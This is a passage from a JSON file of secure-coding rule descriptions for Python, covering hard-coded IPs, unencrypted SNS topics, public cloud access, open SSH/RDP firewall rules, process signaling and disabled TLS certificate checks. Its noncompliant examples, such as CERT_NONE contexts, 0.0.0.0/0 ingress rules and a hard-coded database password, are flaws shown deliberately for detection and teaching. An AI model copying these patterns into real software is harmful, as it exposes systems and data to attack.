having\nto rebuild the software.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nip = '192.168.12.42'\nsock = socket.socket()\nsock.bind((ip, 9090))\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nip = config.get(section, ipAddress)\nsock = socket.socket()\nsock.bind((ip, 9090))\n</pre>\n<h2>Exceptions</h2>\n<p>No issue is reported for the following cases because they are not considered sensitive:</p>\n<ul>\n  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>\n  <li> Broadcast address 255.255.255.255 </li>\n  <li> Non-routable address 0.0.0.0 </li>\n  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href=\"http://www.oid-info.com/introduction.htm\">often match\n  Object Identifiers</a> (OID) </li>\n  <li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a\n  href=\"https://datatracker.ietf.org/doc/html/rfc5737\">RFC 5737</a> </li>\n  <li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href=\"https://datatracker.ietf.org/doc/html/rfc3849\">RFC\n  3849</a> </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "python:S6327": {
        "name": "Using unencrypted SNS topics is security-sensitive",
        "htmlDesc": "<p>Amazon Simple Notification Service (SNS) is a managed messaging service for application-to-application (A2A) and application-to-person (A2P)\ncommunication. SNS topics allows publisher systems to fanout messages to a large number of subscriber systems. Amazon SNS allows to encrypt messages\nwhen they are received. In the case that adversaries gain physical access to the storage medium or otherwise leak a message they are not able to\naccess the data.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The topic contains sensitive data that could cause harm when leaked. </li>\n  <li> There are compliance requirements for the service to store data encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to encrypt SNS topics that contain sensitive information. Encryption and decryption are handled transparently by SNS, so no\nfurther modifications to the application are necessary.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sns.Topic.html\">aws_cdk.aws_sns.Topic</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_sns as sns\n)\n\nclass TopicStack(Stack):\n    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:\n        super().__init__(scope, construct_id, **kwargs)\n        sns.Topic( # Sensitive, unencrypted by default\n            self,\n            \"example\"\n        )\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sns.CfnTopic.html\">aws_cdk.aws_sns.CfnTopic</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_sns as sns\n)\n\nclass TopicStack(Stack):\n    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:\n        super().__init__(scope, construct_id, **kwargs)\n        sns.CfnTopic( # Sensitive, unencrypted by default\n            self,\n            \"example\"\n        )\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sns.Topic.html\">aws_cdk.aws_sns.Topic</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_sns as sns\n)\n\nclass TopicStack(Stack):\n    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:\n        super().__init__(scope, construct_id, **kwargs)\n        my_key = kms.Key(self, \"key\")\n        sns.Topic(\n            self,\n            \"example\",\n            master_key=my_key\n        )\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sns.CfnTopic.html\">aws_cdk.aws_sns.CfnTopic</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_sns as sns\n)\n\nclass TopicStack(Stack):\n    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:\n        super().__init__(scope, construct_id, **kwargs)\n        my_key = kms.Key(self, \"key\")\n        sns.CfnTopic(\n            self,\n            \"example\",\n            kms_master_key_id=my_key.key_id\n        )\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/sns/latest/dg/sns-server-side-encryption.html\">AWS Documentation</a> - Encryption at rest </li>\n  <li> <a href=\"https://aws.amazon.com/blogs/compute/encrypting-messages-published-to-amazon-sns-with-aws-kms/\">Encrypting messages published to\n  Amazon SNS with AWS KMS</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "python:S6329": {
        "name": "Allowing public network access to cloud resources is security-sensitive",
        "htmlDesc": "<p>Enabling public network access to cloud resources can affect an organization’s ability to protect its data or internal operations from data theft\nor disruption.</p>\n<p>Depending on the component, inbound access from the Internet can be enabled via:</p>\n<ul>\n  <li> a boolean value that explicitly allows access to the public network. </li>\n  <li> the assignment of a public IP address. </li>\n  <li> database firewall rules that allow public IP ranges. </li>\n</ul>\n<p>Deciding to allow public access may happen for various reasons such as for quick maintenance, time saving, or by accident.</p>\n<p>This decision increases the likelihood of attacks on the organization, such as:</p>\n<ul>\n  <li> data breaches. </li>\n  <li> intrusions into the infrastructure to permanently steal from it. </li>\n  <li> and various malicious traffic, such as DDoS attacks. </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<p>This cloud resource:</p>\n<ul>\n  <li> should be publicly accessible to any Internet user. </li>\n  <li> requires inbound traffic from the Internet to function properly. </li>\n</ul>\n<p>There is a risk if you answered no to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Avoid publishing cloud services on the Internet unless they are intended to be publicly accessible, such as customer portals or e-commerce\nsites.</p>\n<p>Use private networks (and associated private IP addresses) and VPC peering or other secure communication tunnels to communicate with other cloud\ncomponents.</p>\n<p>The goal is to prevent the component from intercepting traffic coming in via the public IP address. If the cloud resource does not support the\nabsence of a public IP address, assign a public IP address to it, but do not create listeners for the public IP address.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_ec2/Instance.html\">aws_cdk.aws_ec2.Instance</a> and similar constructs:</p>\n<pre>\nfrom aws_cdk import aws_ec2 as ec2\n\nec2.Instance(\n    self,\n    \"vpc_subnet_public\",\n    instance_type=nano_t2,\n    machine_image=ec2.MachineImage.latest_amazon_linux(),\n    vpc=vpc,\n    vpc_subnets=ec2.SubnetSelection(subnet_type=ec2.SubnetType.PUBLIC) # Sensitive\n)\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_ec2/CfnInstance.html\">aws_cdk.aws_ec2.CfnInstance</a>:</p>\n<pre>\nfrom aws_cdk import aws_ec2 as ec2\n\nec2.CfnInstance(\n    self,\n    \"cfn_public_exposed\",\n    instance_type=\"t2.micro\",\n    image_id=\"ami-0ea0f26a6d50850c5\",\n    network_interfaces=[\n        ec2.CfnInstance.NetworkInterfaceProperty(\n            device_index=\"0\",\n            associate_public_ip_address=True, # Sensitive\n            delete_on_termination=True,\n            subnet_id=vpc.select_subnets(subnet_type=ec2.SubnetType.PUBLIC).subnet_ids[0]\n        )\n    ]\n)\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_dms/CfnReplicationInstance.html\">aws_cdk.aws_dms.CfnReplicationInstance</a>:</p>\n<pre>\nfrom aws_cdk import aws_dms as dms\n\nrep_instance = dms.CfnReplicationInstance(\n    self,\n    \"explicit_public\",\n    replication_instance_class=\"dms.t2.micro\",\n    allocated_storage=5,\n    publicly_accessible=True, # Sensitive\n    replication_subnet_group_identifier=subnet_group.replication_subnet_group_identifier,\n    vpc_security_group_ids=[vpc.vpc_default_security_group]\n)\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_rds/CfnDBInstance.html\">aws_cdk.aws_rds.CfnDBInstance</a>:</p>\n<pre>\nfrom aws_cdk import aws_rds as rds\nfrom aws_cdk import aws_ec2 as ec2\n\nrds_subnet_group_public = rds.CfnDBSubnetGroup(\n    self,\n    \"public_subnet\",\n    db_subnet_group_description=\"Subnets\",\n    subnet_ids=vpc.select_subnets(\n        subnet_type=ec2.SubnetType.PUBLIC\n    ).subnet_ids\n)\n\nrds.CfnDBInstance(\n    self,\n    \"public-public-subnet\",\n    engine=\"postgres\",\n    master_username=\"foobar\",\n    master_user_password=\"12345678\",\n    db_instance_class=\"db.r5.large\",\n    allocated_storage=\"200\",\n    iops=1000,\n    db_subnet_group_name=rds_subnet_group_public.ref,\n    publicly_accessible=True, # Sensitive\n    vpc_security_groups=[sg.security_group_id]\n)\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_ec2/Instance.html\">aws_cdk.aws_ec2.Instance</a>:</p>\n<pre>\nfrom aws_cdk import aws_ec2 as ec2\n\nec2.Instance(\n    self,\n    \"vpc_subnet_private\",\n    instance_type=nano_t2,\n    machine_image=ec2.MachineImage.latest_amazon_linux(),\n    vpc=vpc,\n    vpc_subnets=ec2.SubnetSelection(subnet_type=ec2.SubnetType.PRIVATE_WITH_NAT)\n)\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_ec2/CfnInstance.html\">aws_cdk.aws_ec2.CfnInstance</a>:</p>\n<pre>\nfrom aws_cdk import aws_ec2 as ec2\n\nec2.CfnInstance(\n    self,\n    \"cfn_private\",\n    instance_type=\"t2.micro\",\n    image_id=\"ami-0ea0f26a6d50850c5\",\n    network_interfaces=[\n        ec2.CfnInstance.NetworkInterfaceProperty(\n            device_index=\"0\",\n            associate_public_ip_address=False, # Compliant\n            delete_on_termination=True,\n            subnet_id=vpc.select_subnets(subnet_type=ec2.SubnetType.PRIVATE_WITH_NAT).subnet_ids[0]\n        )\n    ]\n)\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_dms/CfnReplicationInstance.html\">aws_cdk.aws_dms.CfnReplicationInstance</a>:</p>\n<pre>\nfrom aws_cdk import aws_dms as dms\n\nrep_instance = dms.CfnReplicationInstance(\n    self,\n    \"explicit_private\",\n    replication_instance_class=\"dms.t2.micro\",\n    allocated_storage=5,\n    publicly_accessible=False,\n    replication_subnet_group_identifier=subnet_group.replication_subnet_group_identifier,\n    vpc_security_group_ids=[vpc.vpc_default_security_group]\n)\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_rds/CfnDBInstance.html\">aws_cdk.aws_rds.CfnDBInstance</a>:</p>\n<pre>\nfrom aws_cdk import aws_rds as rds\nfrom aws_cdk import aws_ec2 as ec2\n\nrds_subnet_group_private = rds.CfnDBSubnetGroup(\n    self,\n    \"private_subnet\",\n    db_subnet_group_description=\"Subnets\",\n    subnet_ids=vpc.select_subnets(\n        subnet_type=ec2.SubnetType.PRIVATE_WITH_NAT\n    ).subnet_ids\n)\n\nrds.CfnDBInstance(\n    self,\n    \"private-private-subnet\",\n    engine=\"postgres\",\n    master_username=\"foobar\",\n    master_user_password=\"12345678\",\n    db_instance_class=\"db.r5.large\",\n    allocated_storage=\"200\",\n    iops=1000,\n    db_subnet_group_name=rds_subnet_group_private.ref,\n    publicly_accessible=False,\n    vpc_security_groups=[sg.security_group_id]\n)\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-instance-addressing.html\">AWS Documentation</a> - Amazon EC2 instance IP\n  addressing </li>\n  <li> <a href=\"https://docs.aws.amazon.com/dms/latest/userguide/CHAP_ReplicationInstance.PublicPrivate.html\">AWS Documentation</a> - Public and\n  private replication instances </li>\n  <li> <a href=\"https://docs.aws.amazon.com/vpc/latest/peering/what-is-vpc-peering.html\">AWS Documentation</a> - VPC Peering </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/668\">CWE-668 - Exposure of Resource to Wrong Sphere</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "python:S4823": {
        "name": "Using command line arguments is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<p>Using command line arguments is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7281\">CVE-2018-7281</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12326\">CVE-2018-12326</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3198\">CVE-2011-3198</a> </li>\n</ul>\n<p>Command line arguments can be dangerous just like any other user input. They should never be used without being first validated and sanitized.</p>\n<p>Remember also that any user can retrieve the list of processes running on a system, which makes the arguments provided to them visible. Thus\npassing sensitive information via command line arguments should be considered as insecure.</p>\n<p>This rule raises an issue on every reference to <code>sys.argv</code>, call to <code>optparse.OptionParser()</code> or a call to\n<code>argparse.ArgumentParser()</code>. The goal is to guide security code reviews.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> any of the command line arguments are used without being sanitized first. </li>\n  <li> your application accepts sensitive information via command line arguments. </li>\n</ul>\n<p>If you answered yes to any of these questions you are at risk.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p><a href=\"https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet\">Sanitize</a> all command line arguments before using them.</p>\n<p>Any user or application can list running processes and see the command line arguments they were started with. There are safer ways of providing\nsensitive information to an application than exposing them in the command line. It is common to write them on the process' standard input, or give the\npath to a file containing the information.</p>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/88\">CWE-88 - Argument Injection or Modification</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/214\">CWE-214 - Information Exposure Through Process Environment</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "python:S4828": {
        "name": "Signaling processes is security-sensitive",
        "htmlDesc": "<p>Signaling processes or process groups can seriously affect the stability of this application or other applications on the same system.</p>\n<p>Accidentally setting an incorrect <code>PID</code> or <code>signal</code> or allowing untrusted sources to assign arbitrary values to these\nparameters may result in a denial of service.</p>\n<p>Also, the system treats the signal differently if the destination <code>PID</code> is less than or equal to 0. This different behavior may affect\nmultiple processes with the same (E)UID simultaneously if the call is left uncontrolled.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The parameters <code>pid</code> and <code>sig</code> are untrusted (they come from an external source). </li>\n  <li> This function is triggered by non-administrators. </li>\n  <li> Signal handlers on the target processes stop important functions. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> For stateful applications with user management, ensure that only administrators trigger this code. </li>\n  <li> Verify that the <code>pid</code> and <code>sig</code> parameters are correct before using them. </li>\n  <li> Ensure that the process sending the signals runs with as few OS privileges as possible. </li>\n  <li> Isolate the process on the system based on its (E)UID. </li>\n  <li> Ensure that the signal does not interrupt any essential functions when intercepted by a target’s signal handlers. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nimport os\n\n@app.route(\"/kill-pid/&lt;pid&gt;\")\ndef send_signal(pid):\n    os.kill(pid, 9)  # Sensitive\n\n@app.route(\"/kill-pgid/&lt;pgid&gt;\")\ndef send_signal(pgid):\n    os.killpg(pgid, 9)  # Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nimport os\n\n@app.route(\"/kill-pid/&lt;pid&gt;\")\ndef send_signal(pid):\n    # Validate the untrusted PID,\n    # With a pre-approved list or authorization checks\n    if is_valid_pid(pid):\n        os.kill(pid, 9)\n\n@app.route(\"/kill-pgid/&lt;pgid&gt;\")\ndef send_signal(pgid):\n    # Validate the untrusted PGID,\n    # With a pre-approved list or authorization checks\n    if is_valid_pgid(pgid):\n        os.kill(pgid, 9)\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/283\">CWE-283 - Unverified Ownership</a> </li>\n  <li> <a href=\"https://man7.org/linux/man-pages/man1/kill.1.html\">kill(1) — Linux manual page</a> </li>\n  <li> <a href=\"https://man7.org/linux/man-pages/man2/kill.2.html\">kill(2) — Linux manual page</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "python:S4829": {
        "name": "Reading the Standard Input is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<p>Reading Standard Input is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2337\">CVE-2005-2337</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11449\">CVE-2017-11449</a> </li>\n</ul>\n<p>It is common for attackers to craft inputs enabling them to exploit software vulnerabilities. Thus any data read from the standard input (stdin)\ncan be dangerous and should be validated.</p>\n<p>This rule flags code that reads from the standard input.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> data read from the standard input is not sanitized before being used. </li>\n</ul>\n<p>You are at risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p><a href=\"https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet\">Sanitize</a> all data read from the standard input before using it.</p>\n<h2>Sensitive Code Example</h2>\n<p>Python 2 and Python 3</p>\n<pre>\nimport sys\nfrom sys import stdin, __stdin__\n\n# Any reference to sys.stdin or sys.__stdin__ without a method call is Sensitive\nsys.stdin  # Sensitive\n\nfor line in sys.stdin:  # Sensitive\n    print(line)\n\nit = iter(sys.stdin)  # Sensitive\nline = next(it)\n\n# Calling the following methods on stdin or __stdin__ is sensitive\nsys.stdin.read()  # Sensitive\nsys.stdin.readline()  # Sensitive\nsys.stdin.readlines()  # Sensitive\n\n# Calling other methods on stdin or __stdin__ does not require a review, thus it is not Sensitive\nsys.stdin.seekable()  # Ok\n# ...\n</pre>\n<p>Python 2 only</p>\n<pre>\nraw_input('What is your password?')  # Sensitive\n</pre>\n<p>Python 3 only</p>\n<pre>\ninput('What is your password?')  # Sensitive\n</pre>\n<p>Function <code>fileinput.input</code> and class <code>fileinput.FileInput</code> read the standard input when the list of files is empty.</p>\n<pre>\nfor line in fileinput.input():  # Sensitive\n    print(line)\n\nfor line in fileinput.FileInput():  # Sensitive\n    print(line)\n\nfor line in fileinput.input(['setup.py']):  # Ok\n    print(line)\n\nfor line in fileinput.FileInput(['setup.py']):  # Ok\n    print(line)\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "python:S6321": {
        "name": "Administration services access should be restricted to specific IP addresses",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Cloud platforms such as AWS, Azure, or GCP support virtual firewalls that can be used to restrict access to services by controlling inbound and\noutbound traffic.<br> Any firewall rule allowing traffic from all IP addresses to standard network ports on which administration services\ntraditionally listen, such as 22 for SSH, can expose these services to exploits and unauthorized access.</p>\n<h3>What is the potential impact?</h3>\n<p>Like any other service, administration services can contain vulnerabilities. Administration services run with elevated privileges and thus a\nvulnerability could have a high impact on the system.</p>\n<p>Additionally, credentials might be leaked through phishing or similar techniques. Attackers who are able to reach the services could use the\ncredentials to log in to the system.</p>\n<h2>How to fix it</h2>\n<p>It is recommended to restrict access to remote administration services to only trusted IP addresses. In practice, trusted IP addresses are those\nheld by system administrators or those of <a href=\"https://aws.amazon.com/quickstart/architecture/linux-bastion/?nc1=h_ls\">bastion-like</a>\nservers.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_ec2/Instance.html\">aws_cdk.aws_ec2.Instance</a> and other constructs that\nsupport a <code>connections</code> attribute:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nfrom aws_cdk import aws_ec2 as ec2\n\ninstance = ec2.Instance(\n    self,\n    \"my_instance\",\n    instance_type=nano_t2,\n    machine_image=ec2.MachineImage.latest_amazon_linux(),\n    vpc=vpc\n)\n\ninstance.connections.allow_from(\n    ec2.Peer.any_ipv4(), # Noncompliant\n    ec2.Port.tcp(22),\n    description=\"Allows SSH from all IPv4\"\n)\ninstance.connections.allow_from_any_ipv4( # Noncompliant\n    ec2.Port.tcp(3389),\n    description=\"Allows Terminal Server from all IPv4\"\n)\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_ec2/SecurityGroup.html\">aws_cdk.aws_ec2.SecurityGroup</a></p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nfrom aws_cdk import aws_ec2 as ec2\nsecurity_group = ec2.SecurityGroup(\n    self,\n    \"custom-security-group\",\n    vpc=vpc\n)\n\nsecurity_group.add_ingress_rule(\n    ec2.Peer.any_ipv4(), # Noncompliant\n    ec2.Port.tcp_range(1, 1024)\n)\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_ec2/CfnSecurityGroup.html\">aws_cdk.aws_ec2.CfnSecurityGroup</a></p>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\nfrom aws_cdk import aws_ec2 as ec2\n\nec2.CfnSecurityGroup(\n    self,\n    \"cfn-based-security-group\",\n    group_description=\"cfn based security group\",\n    group_name=\"cfn-based-security-group\",\n    vpc_id=vpc.vpc_id,\n    security_group_ingress=[\n        ec2.CfnSecurityGroup.IngressProperty( # Noncompliant\n            ip_protocol=\"6\",\n            cidr_ip=\"0.0.0.0/0\",\n            from_port=22,\n            to_port=22\n        ),\n        ec2.CfnSecurityGroup.IngressProperty( # Noncompliant\n            ip_protocol=\"tcp\",\n            cidr_ip=\"0.0.0.0/0\",\n            from_port=3389,\n            to_port=3389\n        ),\n        { # Noncompliant\n            \"ipProtocol\":\"-1\",\n            \"cidrIpv6\":\"::/0\"\n        }\n    ]\n)\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_ec2/CfnSecurityGroupIngress.html\">aws_cdk.aws_ec2.CfnSecurityGroupIngress</a></p>\n<pre data-diff-id=\"4\" data-diff-type=\"noncompliant\">\nfrom aws_cdk import aws_ec2 as ec2\n\nec2.CfnSecurityGroupIngress( # Noncompliant\n    self,\n    \"ingress-all-ip-tcp-ssh\",\n    ip_protocol=\"tcp\",\n    cidr_ip=\"0.0.0.0/0\",\n    from_port=22,\n    to_port=22,\n    group_id=security_group.attr_group_id\n)\n\nec2.CfnSecurityGroupIngress( # Noncompliant\n    self,\n    \"ingress-all-ipv6-all-tcp\",\n    ip_protocol=\"-1\",\n    cidr_ipv6=\"::/0\",\n    group_id=security_group.attr_group_id\n)\n</pre>\n<h4>Compliant solution</h4>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_ec2/Instance.html\">aws_cdk.aws_ec2.Instance</a> and other constructs that\nsupport a <code>connections</code> attribute:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nfrom aws_cdk import aws_ec2 as ec2\n\ninstance = ec2.Instance(\n    self,\n    \"my_instance\",\n    instance_type=nano_t2,\n    machine_image=ec2.MachineImage.latest_amazon_linux(),\n    vpc=vpc\n)\n\ninstance.connections.allow_from_any_ipv4(\n    ec2.Port.tcp(1234),\n    description=\"Allows 1234 from all IPv4\"\n)\n\ninstance.connections.allow_from(\n    ec2.Peer.ipv4(\"192.0.2.0/24\"),\n    ec2.Port.tcp(22),\n    description=\"Allows SSH from all IPv4\"\n)\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_ec2/SecurityGroup.html\">aws_cdk.aws_ec2.SecurityGroup</a></p>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nfrom aws_cdk import aws_ec2 as ec2\nsecurity_group = ec2.SecurityGroup(\n    self,\n    \"custom-security-group\",\n    vpc=vpc\n)\n\nsecurity_group.add_ingress_rule(\n    ec2.Peer.any_ipv4(),\n    ec2.Port.tcp_range(1024, 1048)\n)\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_ec2/CfnSecurityGroup.html\">aws_cdk.aws_ec2.CfnSecurityGroup</a></p>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\nfrom aws_cdk import aws_ec2 as ec2\n\nec2.CfnSecurityGroup(\n    self,\n    \"cfn-based-security-group\",\n    group_description=\"cfn based security group\",\n    group_name=\"cfn-based-security-group\",\n    vpc_id=vpc.vpc_id,\n    security_group_ingress=[\n        ec2.CfnSecurityGroup.IngressProperty(\n            ip_protocol=\"tcp\",\n            cidr_ip=\"0.0.0.0/0\",\n            from_port=1024,\n            to_port=1048\n        ),\n        {\n            \"ipProtocol\":\"6\",\n            \"cidrIp\":\"192.0.2.0/24\",\n            \"fromPort\":22,\n            \"toPort\":22\n        }\n    ]\n)\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_ec2/CfnSecurityGroupIngress.html\">aws_cdk.aws_ec2.CfnSecurityGroupIngress</a></p>\n<pre data-diff-id=\"4\" data-diff-type=\"compliant\">\nfrom aws_cdk import aws_ec2 as ec2\n\nec2.CfnSecurityGroupIngress(\n    self,\n    \"ingress-all-ipv4-tcp-http\",\n    ip_protocol=\"6\",\n    cidr_ip=\"0.0.0.0/0\",\n    from_port=80,\n    to_port=80,\n    group_id=security_group.attr_group_id\n)\n\nec2.CfnSecurityGroupIngress(\n    self,\n    \"ingress-range-tcp-rdp\",\n    ip_protocol=\"tcp\",\n    cidr_ip=\"192.0.2.0/24\",\n    from_port=3389,\n    to_port=3389,\n    group_id=security_group.attr_group_id\n)\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/vpc/latest/userguide/VPC_SecurityGroups.html\">AWS Documentation</a> - Security groups for your VPC </li>\n  <li> <a href=\"https://docs.microsoft.com/en-us/azure/virtual-network/network-security-groups-overview\">Azure Documentation</a> - Network security\n  groups </li>\n  <li> <a href=\"https://cloud.google.com/vpc/docs/using-firewalls\">GCP Documentation</a> - Firewalls </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "python:S4830": {
        "name": "Server certificates should be verified during SSL/TLS connections",
        "htmlDesc": "<p>This vulnerability makes it possible that an encrypted communication is intercepted.</p>\n<h2>Why is this an issue?</h2>\n<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them.\nCertificate validation adds an extra layer of trust and security to this process to ensure that a system is indeed the one it claims to be.</p>\n<p>When certificate validation is disabled, the client skips a critical security check. This creates an opportunity for attackers to pose as a trusted\nentity and intercept, manipulate, or steal the data being transmitted.</p>\n<h3>What is the potential impact?</h3>\n<p>Establishing trust in a secure way is a non-trivial task. When you disable certificate validation, you are removing a key mechanism designed to\nbuild this trust in internet communication, opening your system up to a number of potential threats.</p>\n<h4>Identity spoofing</h4>\n<p>If a system does not validate certificates, it cannot confirm the identity of the other party involved in the communication. An attacker can\nexploit this by creating a fake server and masquerading as a legitimate one. For example, they might set up a server that looks like your bank’s\nserver, tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect\nany data your system sends to them, potentially leading to significant data breaches.</p>\n<h4>Loss of data integrity</h4>\n<p>When TLS certificate validation is disabled, the integrity of the data you send and receive cannot be guaranteed. An attacker could modify the data\nin transit, and you would have no way of knowing. This could range from subtle manipulations of the data you receive to the injection of malicious\ncode or malware into your system. The consequences of such breaches of data integrity can be severe, depending on the nature of the data and the\nsystem.</p>\n<h2>How to fix it in Python Standard Library</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of disabled certificate validation.</p>\n<p>Certificate validation is not enabled by default when <code>_create_unverified_context</code> is used. It is recommended to use\n<code>_create_default_https_context</code> instead to create a secure context that validates certificates.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"21\" data-diff-type=\"noncompliant\">\nimport ssl\n\nctx1 = ssl._create_unverified_context() # Noncompliant\nctx2 = ssl._create_stdlib_context() # Noncompliant\n\nctx3 = ssl.create_default_context()\nctx3.verify_mode = ssl.CERT_NONE # Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"21\" data-diff-type=\"compliant\">\nimport ssl\n\nctx = ssl.create_default_context()\nctx.verify_mode = ssl.CERT_REQUIRED\n\n# By default, certificate validation is enabled\nctx = 